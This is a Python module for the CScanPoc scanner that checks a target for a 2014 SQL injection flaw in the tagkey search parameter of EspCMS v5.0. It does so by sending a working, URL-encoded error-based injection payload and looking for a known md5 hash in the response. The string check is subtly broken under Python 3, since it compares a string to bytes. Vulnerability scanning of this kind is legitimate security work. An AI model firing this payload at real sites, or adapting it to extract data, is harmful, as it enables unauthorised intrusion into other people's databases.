# coding: utf-8
import re
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'EspCMS_0014'  # 平台漏洞编号，留空
    name = 'EspCMS v5.0 /index.php?ac=search SQL注入'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-12-16'  # 漏洞公布时间
    desc = '''
    EspCMS v5.0 /index.php，tagkey造成了注入。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=019995'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'EspCMS(易思CMS)'  # 漏洞应用名称
    product_version = '5.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '47e1ef8d-3e38-49fe-a255-18ab0f37f73f'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ("/index.php?ac=search&at=taglist&tagkey=%2527,tags%29%20or%28select%201%20from%28select" +
                       "%20count%28*%29,concat%28%28select%20%28select%20concat%28md5%283.1415%29%29%29%20from" +
                       "%20information_schema.tables%20where%20table_schema=database%28%29%20limit%200,1%29," +
                       "floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23")
            verify_url = self.target + payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()
            if "63e1f04640e83605c1d177544a5a0488" in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
